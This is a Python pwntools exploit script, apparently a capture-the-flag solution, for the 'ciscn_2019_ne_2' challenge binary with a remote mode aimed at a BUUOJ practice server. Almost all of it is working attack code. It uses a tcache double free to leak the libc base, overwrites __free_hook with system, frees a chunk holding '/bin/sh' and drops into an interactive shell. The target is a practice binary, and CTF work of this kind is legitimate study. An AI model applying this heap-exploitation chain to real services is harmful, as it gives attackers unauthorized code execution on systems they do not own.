# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''
from pwn import *


# define the context
binary_name = './ciscn_2019_ne_2'
libc_name = './ubuntu18-libc-2.27-x64.so' if args.REMOTE \
        else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 27317)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        brva 0x0000000000001324
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
sla(b'name', b'NEUQRO')

def Add(size, msg):
    sla(b'> \n', b'1')
    sla(b'input the size \n', str(size).encode())
    sla(b'now you can input something...\n', msg)

def Free(idx):
    sla(b'> \n', b'2')
    sla(b'input the index\n', str(idx).encode())

def Show(idx):    
    sla(b'> \n', b'3')
    sla(b'input the index\n', str(idx).encode())


Add(0x80, b'fa1c40')
Add(0x10, b'/bin/sh\x00')

Add(0x70, b'fa1c42')
Add(0x10, b'fa1c43')
# double free
for i in range(2):
    Free(2)

# fill the tcache 
for i in range(8):
    Free(0)

Show(0) # leak libc
malloc_hook_addr = u64(ru(b'\x7f').ljust(8, b'\x00')) - 0x60 - 0x10
libc.address = malloc_hook_addr - libc.sym['__malloc_hook']
log.info(f'libc address: {hex(libc.address)}')

Add(0x70, p64(libc.sym['__free_hook']))
Add(0x70, b'fa1c44')
Add(0x70, p64(libc.sym['system']))
Free(1)

# interact with the shell
io.interactive()
